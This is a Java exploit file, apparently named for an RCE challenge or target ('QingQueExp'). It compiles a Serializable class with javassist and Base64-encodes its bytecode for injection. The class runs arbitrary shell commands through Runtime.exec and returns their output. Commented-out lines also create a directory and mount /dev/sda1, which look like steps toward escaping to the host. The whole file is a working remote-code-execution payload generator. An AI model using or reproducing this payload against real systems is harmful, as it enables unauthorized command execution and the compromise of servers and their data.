import javassist.*;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.Serializable;
import java.util.Base64;

public class QingQueExp {
    public static void main(String[] args) throws ClassNotFoundException, IOException, NotFoundException, CannotCompileException {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(RCEME.class));
        CtClass ctClass= pool.getCtClass(RCEME.class.getName());
        System.out.println(ctClass.getName());
        System.out.println(Base64.getEncoder().encodeToString(ctClass.toBytecode()));
    }
    public class RCEME implements Serializable {

        public String printResult(){
            String command = "ls";         //要执行的命令
            StringBuffer b=new StringBuffer();
            Runtime runtime = Runtime.getRuntime();
//            String[] echo = new String[]{"bash","-c","echo -e \"import java.io.IOException;\\npublic class CaseRunner1 {\\n public static void main(String[] args) throws IOException {\\n System.out.println(123);\\n }\\n}\\n\">CaseRunner1.java"};
            try {
//                runtime.exec(echo);
//                runtime.exec(new String[]{"bash","-c","mkdir /test"});
//                runtime.exec(new String[]{"bash","-c","mount /dev/sda1 /test"});
                BufferedReader br = new BufferedReader(new InputStreamReader(runtime.exec(new String[]{"bash","-c",command}).getInputStream())); //获得执行命令回显
                String line=null;
                while ((line=br.readLine())!=null) {
                    b.append(line+"\n");
                }
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
            return b.toString();
        }
    }
}
